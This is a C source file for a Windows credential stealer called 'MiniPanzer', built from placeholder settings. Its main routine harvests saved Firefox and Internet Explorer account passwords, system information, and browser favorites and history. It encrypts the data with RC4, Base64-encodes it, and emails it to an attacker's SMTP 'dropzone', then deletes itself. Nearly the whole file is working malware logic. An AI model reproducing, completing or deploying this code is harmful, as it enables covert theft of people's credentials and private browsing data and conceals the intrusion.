/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */




#include <windows.h>
#include <Winhttp.h>
#include <stdio.h>
#include <shellapi.h>
#include "Panzer_Definitions.h"


#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Secur32.lib")
#pragma comment(lib, "Netapi32.lib")


char *gMiniPanzerPassword         = "SYN_PW\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gMiniPanzerID               = "SYN_ID\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gSMTPServer                 = "SYN_SMTP_SERVER\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gSMTPRecipient              = "SYN_SMTP_RCPT\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gSMTPSender                 = "SYN_SMTP_SENDER\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gDumpSystemInformation      = "SYN_DUMP_SYSTEMINFO\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gDump3rdPartyAccounts       = "SYN_DUMP_3RDPARTIES_ACCOUNTS\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gDumpBrowserFavorites       = "SYN_DUMP_FAVORITES\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gDumpBrowserHistory         = "SYN_DUMP_HISTORY\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gSetProxyserver             = "SYN_SET_PROXY\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
char *gSetHostsEntry              = "SYN_SET_HOSTS\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

char gRealMiniPanzerID[MAX_BUF_SIZE + 1];
char gRealMiniPanzerPassword[MAX_BUF_SIZE + 1];
char gRealMiniPanzerBrowserSignature[MAX_BUF_SIZE + 1];




int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
  int lRetVal = 0;
  int lFuncRetVal = 0;
  char *lDataBufferPlaintext = NULL;
  int lDataBufferSize = 0;
  char lTemp[MAX_BUF_SIZE + 1];
  char *lEncryptedData = NULL;
  int lEncryptedDataSize = 0;
  char *lEncodedData = NULL;
  int lEncodedDataSize = 0;


  /*
   * Initialisation.
   *
   */

  ZeroMemory(gRealMiniPanzerID, sizeof(gRealMiniPanzerID));
  ZeroMemory(gRealMiniPanzerPassword, sizeof(gRealMiniPanzerPassword));

  CopyMemory(gRealMiniPanzerID, gMiniPanzerID, strchr(gMiniPanzerID, '\0') - gMiniPanzerID );
  CopyMemory(gRealMiniPanzerPassword, gMiniPanzerPassword, strchr(gMiniPanzerPassword, '\0') - gMiniPanzerPassword);


  /*
   * Dump 3rd party account data
   *
   */


  if (gDump3rdPartyAccounts[0] == 'Y')
  {

    /*
     * FireFox accounts
     *
     */

    ZeroMemory(lTemp, sizeof(lTemp));
    _snprintf(lTemp, sizeof(lTemp) - 1, "\n\n\n\n\nFirefox account data\n--------------------\n\n");
    lDataBufferPlaintext = addDataToBuffer(lDataBufferPlaintext, &lDataBufferSize, lTemp, strlen(lTemp));
    lDataBufferPlaintext = dumpFFAccounts(lDataBufferPlaintext, &lDataBufferSize);


    /*
     * IE accounts
     *
     */

    ZeroMemory(lTemp, sizeof(lTemp));
    _snprintf(lTemp, sizeof(lTemp) - 1, "\n\n\n\n\nInternet Explorer account data\n------------------------------\n\n");
    lDataBufferPlaintext = addDataToBuffer(lDataBufferPlaintext, &lDataBufferSize, lTemp, strlen(lTemp));
    lDataBufferPlaintext = dumpIE6Accounts(lDataBufferPlaintext, &lDataBufferSize);
  } // if (gDump3rd...



  /*
   * Dump local system information.
   *
   */

  if (gDumpSystemInformation[0] == 'Y')
  {
    ZeroMemory(lTemp, sizeof(lTemp));
    _snprintf(lTemp, sizeof(lTemp) - 1, "\n\n\n\n\nLocal system information\n------------------------\n\n");
    lDataBufferPlaintext = addDataToBuffer(lDataBufferPlaintext, &lDataBufferSize, lTemp, strlen(lTemp));

    lDataBufferPlaintext = generalSystemInformation(lDataBufferPlaintext, &lDataBufferSize);
  } // if (gDumpSystemInf...




  /*
   * Dump browser favorites
   *
   */

  if (gDumpBrowserFavorites[0] == 'Y')
  {
    if (getenv("HOMEPATH") != NULL)
    {
      ZeroMemory(lTemp, sizeof(lTemp));
      _snprintf(lTemp, sizeof(lTemp) - 1, "\n\n\n\n\nIE favorites\n------------\n\n");
      lDataBufferPlaintext = addDataToBuffer(lDataBufferPlaintext, &lDataBufferSize, lTemp, strlen(lTemp));

      lDataBufferPlaintext = searchIEFavorites(getenv("HOMEPATH"), lDataBufferPlaintext, &lDataBufferSize);
    } // if (getenv("HOME...
  } // if (gDumpBrowserFavor...



  /*
   * Dump browser history 
   *
   */

  if (gDumpBrowserHistory[0] == 'Y')
  {
    if (getenv("HOMEPATH") != NULL)
    {
      ZeroMemory(lTemp, sizeof(lTemp));
      _snprintf(lTemp, sizeof(lTemp) - 1, "\n\n\n\n\nIE history\n----------\n\n");
      lDataBufferPlaintext = addDataToBuffer(lDataBufferPlaintext, &lDataBufferSize, lTemp, strlen(lTemp));

      lDataBufferPlaintext = getIEHistory(getenv("HOMEPATH"), lDataBufferPlaintext, &lDataBufferSize);
    } // if (getenv("HOME...
  } // if (gDumpBrowserHisto...



  /*
   * Encrypt data
   *
   */

  if (lDataBufferSize > 0)
  {
    if ((lEncryptedData = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY , lDataBufferSize * 2)) == NULL)
      goto END;

    RC4Encrypt((unsigned char *) gRealMiniPanzerPassword, (unsigned char *) lDataBufferPlaintext, lDataBufferSize, (unsigned char *) lEncryptedData, lDataBufferSize * 2, &lEncryptedDataSize);

    /*
     * Encode data to Base64 and send it to the dropzone.
     * In this case to the 
     *
     */

    lEncodedData = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (lDataBufferSize * 2));
    if ((lEncodedDataSize = Base64Encode(lEncodedData, lEncryptedData, lEncryptedDataSize)) > 0)
      sendMail(gSMTPServer, gSMTPRecipient, gSMTPSender, gMiniPanzerID, lEncodedData, lEncodedDataSize);

  } // if (lDataBufferSiz...




END:

  if (lEncryptedData != NULL)
    HeapFree(GetProcessHeap(), 0, lEncryptedData);


  if (lEncodedData != NULL)
    HeapFree(GetProcessHeap(), 0, lEncodedData);



 /*
  * Delete yourself 'n' exit.
  *
  */

  deleteYourself();

  exit(lRetVal);
}








/*
 *
 *
 */

char *addDataToBuffer(char *pOldData, int *pOldDataSize, char *pNewData, int pNewDataSize)
{
  char *lRetVal = NULL;


  /*
   * Allocate the Buffer on the heap.
   *
   */

  if (pOldData == NULL)
  {
    if ((lRetVal = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pNewDataSize + 1)) != NULL)
    {
      CopyMemory(lRetVal, pNewData, pNewDataSize);
      *pOldDataSize = pNewDataSize;
    } // if (lRetVal = ...



  /*
   * Rellocate the Buffer on the heap. In case of failure
   * release all the allocated buffer area.
   *
   */

  } else {
    if ((lRetVal = (char *) HeapReAlloc(GetProcessHeap(), 0, pOldData, *pOldDataSize + pNewDataSize )) != NULL)
    {
      ZeroMemory(&lRetVal[*pOldDataSize], pNewDataSize);
      CopyMemory(&lRetVal[*pOldDataSize], pNewData, pNewDataSize);
      *pOldDataSize += pNewDataSize;
    } else {
      HeapFree(GetProcessHeap(), 0, pOldData);
      lRetVal = NULL;
    }
  } // if (pOldBuffer == ...

  return(lRetVal);
}